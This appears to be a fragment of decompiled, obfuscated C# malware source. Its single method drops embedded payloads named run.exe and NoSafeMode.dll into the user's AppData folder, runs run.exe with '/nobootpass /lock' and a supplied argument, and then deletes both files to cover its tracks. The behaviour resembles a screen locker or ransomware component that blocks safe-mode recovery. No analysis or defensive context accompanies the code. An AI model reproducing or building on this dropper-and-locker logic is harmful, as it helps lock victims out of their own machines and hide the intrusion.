using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using ns0;

namespace ns1;

internal class Class13
{
	public static void smethod_0(string string_0)
	{
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\run.exe", Class19.smethod_11());
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\NoSafeMode.dll", Class19.smethod_12());
		Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\run.exe", "/nobootpass /lock " + string_0).WaitForExit();
		Thread.Sleep(2000);
		File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\run.exe");
		File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\NoSafeMode.dll");
	}
}
